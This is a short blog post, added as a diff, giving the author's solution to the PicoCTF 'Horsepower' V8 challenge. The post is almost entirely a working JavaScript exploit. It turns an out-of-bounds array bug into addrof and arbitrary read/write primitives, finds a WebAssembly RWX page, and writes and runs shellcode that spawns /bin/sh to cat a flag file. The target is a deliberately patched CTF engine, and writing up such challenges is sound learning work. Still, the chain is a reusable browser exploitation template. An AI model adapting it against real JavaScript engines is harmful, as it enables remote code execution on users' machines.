@@ -1,0 +1,153 @@
+---
+layout: post
+title: PicoCTF Horsepower - V8 exploitation
+date: 2022-07-13
+permalink: /:title/
+description: "Solution to a V8 exploitation challenge"
+tags: [ctf]
+share: true
+comments: false
+published: true
+status: ongoing
+---
+
+This is the solution to Horsepower, one of the simplest v8 challenges
+available I solved one year ago or so.
+Wrietups can be found all over the internet so I'd rather not write
+one of my own. Thanks to all the people that helped me!
+
+![solution](/assets/img/d8-horsepower.png)
+
+this is the code used:
+
+```javascript
+var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
+var wasm_mod = new WebAssembly.Module(wasm_code)
+var wasm_instance = new WebAssembly.Instance(wasm_mod)
+var f = wasm_instance.exports.main
+
+var shellcode = [
+     0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x99, 0x50,
+     0x54, 0x5f, 0x52 , 0x66, 0x68, 0x2d, 0x63, 0x54, 0x5e, 0x52, 0xe8, 0x12,
+     0x00, 0x00, 0x00, 0x2f, 0x62, 0x69 , 0x6e, 0x2f, 0x63, 0x61, 0x74, 0x20,
+     0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78, 0x74, 0x00 , 0x56, 0x57, 0x54,
+     0x5e, 0x6a, 0x3b, 0x58, 0x0f, 0x05
+]
+
+var buf = new ArrayBuffer(8)
+var f64_buf = new Float64Array(buf)
+var u64_buf = new Uint32Array(buf)
+
+function copy_shellcode(addr, shellcode) {
+	print("[*] writing shellcode to RWX page...")
+
+	let buf = new ArrayBuffer(0x100)
+	let dataview = new DataView(buf)
+	let buf_addr = addrof(buf)
+	let backing_store_addr = buf_addr + 0x14n
+
+	print("[*] buf_addr:", hex(buf_addr))
+	write(backing_store_addr, addr)
+	print("[*] backing_store_addr:", hex(backing_store_addr))
+
+	for (let i = 0;i < shellcode.length;i++) {
+		dataview.setUint8(i, shellcode[i], true) 
+	}
+	print("[*] shellcode writing successfully completed!")
+}
+
+
+function hex(val) {
+	return "0x" + (val & 0xffffffffn).toString(16)
+}
+
+function ftoi(val) { // typeof(val) == float
+	f64_buf[0] = val
+	return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n)
+}
+
+function itof(val) { // typeof(val) == BigInt
+	u64_buf[0] = Number(val & 0xffffffffn)
+	u64_buf[1] = Number(val >> 32n)
+	return f64_buf[0]
+}
+
+// allocate two adjacent objects in v8's heap
+float_arr = [1.1, 1.2]
+obj_arr = [{a:1}, {b:2}]
+d = {}
+
+// trigger the overflow
+float_arr.setHorsepower(10)
+
+// since element's content is placed right above the metadata of the
+// object, simply accessing past its bound allows an attacker to read
+// such values. The first one oob is the map value, the second the
+// properties pointer, the third one the elements pointer
+float_map = ftoi(float_arr[2])
+print("[*] float_map: ", hex(float_map))
+
+// by inspecting memory, a float array has its properties pointer
+// far past the second position, it is very likely an optimizaiton.
+// Instead, at the second memory location its memory elements can
+// be found
+float_elements = ftoi(float_arr[3])
+print("[*] float_elements: ", hex(float_elements))
+// by inspecting memory, it can be found that the two elements pointer
+// differ by 0x28
+obj_elements = float_elements + 0x28n
+print("[*] obj_elements: ", hex(obj_elements))
+
+function addrof(obj) {
+	// make float_arr elements point to the elems. in the obj's object
+	float_arr[3] = itof(obj_elements)
+	obj_arr[0] = obj
+	return ftoi(float_arr[0])
+}
+
+print("[*] addrof(float_arr): ", hex(addrof(float_arr)))
+
+
+function read(addr) {
+    // change the elements points to the address to be read
+	addr = addr - 0x8n
+	if (addr % 2n == 0) {
+		addr += 0x1n
+	}
+
+	tmp_r = [1.1, 1.2]
+	tmp_r.setHorsepower(10)
+	tmp_r[3] = itof(addr)
+
+	return ftoi(tmp_r[0])
+}
+
+print("[*] obj_arr's addr content: ", hex(read(addrof(obj_arr))))
+
+function write(addr, val) {
+	addr = addr - 0x8n
+	if (addr % 2n == 0) {
+		addr += 0x1n
+	}
+
+	tmp_w = [1.1, 1.2]
+	tmp_w.setHorsepower(10)
+	tmp_w[3] = itof(addr)
+
+	return tmp_w[0] = itof(val)
+}
+
+
+var rwx_page_addr = read(addrof(wasm_instance) + 104n - 0x1n)
+
+print("[*] wasm_instance addr: ", hex(addrof(wasm_instance)))
+print("[*] rwx page addr: ", hex(rwx_page_addr))
+
+copy_shellcode(rwx_page_addr, shellcode)
+print("[*] wasm function addr: ", hex(addrof(f)))
+
+print("[*] getting code exec")
+f()
+```
+
+
